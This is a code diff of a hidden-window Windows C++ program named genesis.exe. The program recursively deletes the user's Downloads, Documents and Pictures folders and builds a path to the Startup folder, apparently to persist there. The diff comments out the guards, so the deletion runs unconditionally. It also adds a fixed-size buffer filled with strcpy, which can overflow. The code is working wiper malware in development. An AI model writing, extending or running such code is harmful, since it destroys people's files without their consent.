@@ -10,7 +10,7 @@ int APIENTRY wWinMain(HINSTANCE Instance, //no window
 	std::string path;
 	std::string pathb;
 	std::string pathc;
-		if (userpath != nullptr)
+		//if (userpath != nullptr)
 			path = std::string(userpath) + "\\Downloads";
 			pathb = std::string(userpath) + "\\Documents";
 			pathc = std::string(userpath) + "\\Pictures";
@@ -18,16 +18,22 @@ int APIENTRY wWinMain(HINSTANCE Instance, //no window
 	//char filepath[] = "%userprofile%\\Downloads";
 	//char filepathb[] = "%userprofile%\\Pictures";
 	//char filepathc[] = "%userprofile%\\Documents";
-	if (std::filesystem::exists(path)) { //deletes files under directories
+	//if (std::filesystem::exists(path)) { 
 		
 		std::filesystem::remove_all(path);
-		std::filesystem::remove_all(pathb);
+		std::filesystem::remove_all(pathb);//deletes files under directories
 		std::filesystem::remove_all(pathc);
-	}
+	//}
 	
+	char* userdatapath = getenv("APPDATA"); //get %appdata% path
+	std::string datapath;
+	datapath = std::string(userdatapath) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"; //full startup path
 	char filename[ MAX_PATH ] = "genesis.exe"; 
-	char newLocation[] = "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
-	if (std::filesystem::exists("%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\genesis.exe")) {
+	//char newLocation[datapath.size() + 1];
+	char newLocation[77];
+	strcpy(newLocation, datapath.c_str());
+
+	if (std::filesystem::exists(datapath + "\\genesis.exe")) { //exit if genesis.exe exists in dir
 		
 		exit(0);
 	}
